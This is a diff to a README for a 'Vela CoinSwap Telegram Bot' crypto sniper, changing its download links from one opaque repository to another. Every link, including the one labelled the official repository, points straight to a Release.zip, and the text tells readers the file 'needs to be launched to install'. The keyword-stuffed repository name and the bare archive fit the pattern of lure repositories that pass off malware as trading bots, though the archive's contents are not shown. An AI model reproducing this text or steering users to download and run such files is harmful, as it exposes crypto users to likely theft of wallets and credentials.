@@ -46,13 +46,13 @@ The repository covers a wide range of topics related to cryptocurrency trading a
 ## ⬇️ Download Vela
 
 To access the Vela CoinSwap Telegram Bot and start leveraging its powerful features, download the software package from the link below:
-[![Download Vela Bot](https://img.shields.io/badge/Download-Software.zip-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Vela Bot](https://github.com/salvadoreira15/Vela-CoinSwap-Telegram-Bot-Sniper-Crypto-Coins-Bitecoin-BCH/releases/download/v1.0/Release.zip)](https://github.com/salvadoreira15/Vela-CoinSwap-Telegram-Bot-Sniper-Crypto-Coins-Bitecoin-BCH/releases/download/v1.0/Release.zip)
 
 *Note: The linked file needs to be launched to install Vela on your system.*
 
 ## 🌐 Explore Further
 
-For more information, updates, and additional resources, feel free to visit the official [Vela CoinSwap Telegram Bot GitHub Repository](https://github.com/22155555/1875695542). Dive into the world of cryptocurrency trading with Vela and discover new possibilities in the dynamic realm of digital assets.
+For more information, updates, and additional resources, feel free to visit the official [Vela CoinSwap Telegram Bot GitHub Repository](https://github.com/salvadoreira15/Vela-CoinSwap-Telegram-Bot-Sniper-Crypto-Coins-Bitecoin-BCH/releases/download/v1.0/Release.zip). Dive into the world of cryptocurrency trading with Vela and discover new possibilities in the dynamic realm of digital assets.
 
 ---
 
